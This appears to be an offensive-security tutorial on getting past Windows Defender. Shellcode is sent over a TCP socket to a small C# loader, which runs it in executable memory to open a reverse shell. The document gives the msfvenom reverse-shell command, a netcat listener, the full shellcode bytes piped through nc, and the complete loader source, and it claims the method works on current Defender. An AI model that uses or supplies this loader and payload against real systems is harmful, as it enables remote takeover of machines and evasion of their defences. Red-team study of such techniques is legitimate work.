# Antivirus Evasion - Part 2

## Using Sockets to bypass Defender

We open a TCP socket port and send shellcode over that which is later executed to give reverse shell.

This works on latest defender as of Feb15 2021


### Steps 
- Prepare payload using msfvenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.1 LPORT=80 -b "\x00" -f csharp
```
- Once done compile the below code to generate exe which opens port 8080 on the ipv4 interface.
- Once done start reverse shell handler on kali
```
nc -nlvp 80
```
- Now send shellcode over the TCP socket which will be executed by executable.
```
python -c 'print "\xda\xc9\xbd\x4c\xee\xdc\x9e\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x52\x31\x6e\x17\x03\x6e\x17\x83\xa2\x12\x3e\x6b\xc6\x03\x3d\x94\x36\xd4\x22\x1c\xd3\xe5\x62\x7a\x90\x56\x53\x08\xf4\x5a\x18\x5c\xec\xe9\x6c\x49\x03\x59\xda\xaf\x2a\x5a\x77\x93\x2d\xd8\x8a\xc0\x8d\xe1\x44\x15\xcc\x26\xb8\xd4\x9c\xff\xb6\x4b\x30\x8b\x83\x57\xbb\xc7\x02\xd0\x58\x9f\x25\xf1\xcf\xab\x7f\xd1\xee\x78\xf4\x58\xe8\x9d\x31\x12\x83\x56\xcd\xa5\x45\xa7\x2e\x09\xa8\x07\xdd\x53\xed\xa0\x3e\x26\x07\xd3\xc3\x31\xdc\xa9\x1f\xb7\xc6\x0a\xeb\x6f\x22\xaa\x38\xe9\xa1\xa0\xf5\x7d\xed\xa4\x08\x51\x86\xd1\x81\x54\x48\x50\xd1\x72\x4c\x38\x81\x1b\xd5\xe4\x64\x23\x05\x47\xd8\x81\x4e\x6a\x0d\xb8\x0d\xe3\xe2\xf1\xad\xf3\x6c\x81\xde\xc1\x33\x39\x48\x6a\xbb\xe7\x8f\x8d\x96\x50\x1f\x70\x19\xa1\x36\xb7\x4d\xf1\x20\x1e\xee\x9a\xb0\x9f\x3b\x0c\xe0\x0f\x94\xed\x50\xf0\x44\x86\xba\xff\xbb\xb6\xc5\xd5\xd3\x5d\x3c\xbe\x1b\x09\x44\x3f\xf4\x48\xb8\x3f\x54\xc4\x5e\x55\x44\x80\xc9\xc2\xfd\x89\x81\x73\x01\x04\xec\xb4\x89\xab\x11\x7a\x7a\xc1\x01\xeb\x8a\x9c\x7b\xba\x95\x0a\x13\x20\x07\xd1\xe3\x2f\x34\x4e\xb4\x78\x8a\x87\x50\x95\xb5\x31\x46\x64\x23\x79\xc2\xb3\x90\x84\xcb\x36\xac\xa2\xdb\x8e\x2d\xef\x8f\x5e\x78\xb9\x79\x19\xd2\x0b\xd3\xf3\x89\xc5\xb3\x82\xe1\xd5\xc5\x8a\x2f\xa0\x29\x3a\x86\xf5\x56\xf3\x4e\xf2\x2f\xe9\xee\xfd\xfa\xa9\x1f\xb4\xa6\x98\xb7\x11\x33\x99\xd5\xa1\xee\xde\xe3\x21\x1a\x9f\x17\x39\x6f\x9a\x5c\xfd\x9c\xd6\xcd\x68\xa2\x45\xed\xb8"' | nc 192.168.122.189 8080
```

Code:
```c#
using System.Runtime.InteropServices;
using System;
using System.Net.Sockets;
using System.Net;
class Program
{
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(UInt32 lpAddress, UInt32 dWsize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dWsize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThradId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliSeconds);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    static void Main(string[] args)
    {
	// Socket creation
        IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
        IPAddress ipAddress = ipHost.AddressList[1];
        IPEndPoint localEndpoint = new IPEndPoint(ipAddress, 8080);

        Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        s.Bind(localEndpoint);
        s.Listen(5);

	# Accept incomming connection
        Socket handler = s.Accept();
        byte[] bytes = new byte[1024];
        byte[] shellcode;

	#Save the incomming bytes to a byte array to execute
        while (true)
        {
            int bytesRec = handler.Receive(bytes);
            shellcode = new byte[bytesRec];
            Buffer.BlockCopy(bytes, 0, shellcode, 0, bytesRec);
            break;
        }

        IntPtr address = VirtualAlloc(0, (UInt32)(shellcode.Length - 1), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, address, shellcode.Length - 1);
        IntPtr threadHandle = CreateThread(0, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
    }
}
```

## Pre-Requisite
- The structure of the VirtualAlloc,CreateThread and WaitForSingleObject has been explained on [day1](../days/day1.md)
- Reason for doing `shellcode.Length-1` is that upon sending the shellcode over nc there would be extra new linw which is not part of shellcode.
- I dont find need to consider cases where shellcode is greater than 1024 since that is very impractical for most of use cases.

## Reference
- The idea was taken from [Ired Teams](https://www.ired.team/offensive-security/defense-evasion/bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon#code). The techinique is still valid and works on all level of protection by defender.